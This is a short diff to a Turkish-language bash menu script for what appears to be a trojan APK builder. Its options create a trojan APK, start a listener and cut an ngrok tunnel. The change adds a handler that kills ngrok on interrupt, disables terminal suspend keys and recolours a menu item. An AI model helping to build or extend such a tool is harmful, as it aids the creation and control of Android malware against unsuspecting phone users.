@@ -54,13 +54,23 @@ fi
 cd files
 bash güncelleme.sh
 bash banner.sh
+function finish() {
+	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
+	if [[ $kontrol == ngrok ]];then
+		killall ngrok
+	fi
+	exit
+}
+stty susp ""
+stty eof ""
+trap finish SIGINT
 printf "
 
 \e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mTROJAN APK OLUŞTUR\e[97m
 
 \e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mDİNLEMEYE AL\e[97m
 
-\e[31m[\e[97m3\e[31m]\e[97m ────────── \e[34mNGROK DIŞ BAĞLANTI KES\e[97m
+\e[31m[\e[97m3\e[31m]\e[97m ────────── \e[33mNGROK DIŞ BAĞLANTI KES\e[97m
 
 \e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
 "
